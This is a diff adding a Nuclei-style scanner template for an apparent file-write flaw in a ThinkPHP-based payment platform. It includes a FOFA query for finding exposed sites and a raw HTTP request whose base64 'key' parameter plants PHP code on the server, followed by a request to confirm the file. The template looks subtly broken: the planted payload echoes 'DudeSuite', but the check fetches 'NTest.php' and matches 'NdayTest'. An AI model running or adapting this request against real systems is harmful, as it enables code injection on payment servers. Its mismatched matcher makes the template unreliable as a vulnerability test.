@@ -1,0 +1,34 @@
+id: upay-thinkphp-609-file-write
+
+info:
+  name: "U支付系统ThinkPHP 6.0.9前台文件写入漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: Fofa:"/usdtmerchant/login/reg.html"
+          该支付平台基于ThinkPHP 6框架开发，包含充值/提币/余额查询等核心接口。近期发生源码泄露事件，暴露了完整的U钱包对接实现及测试代码。系统支持跨平台接口集成，但存在文件操作安全缺陷。
+  tags: U支付系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /index/index/get_trc20?key=PD9waHAgZWNobyAnRHVkZVN1aXRlJzsgdW5saW5rKF9fRklMRV9fKTsgPz4=&name=NdayTest HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Cookie: PHPSESSID=60bb4cc1be5320f384ba89f6f7f0b3d9
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
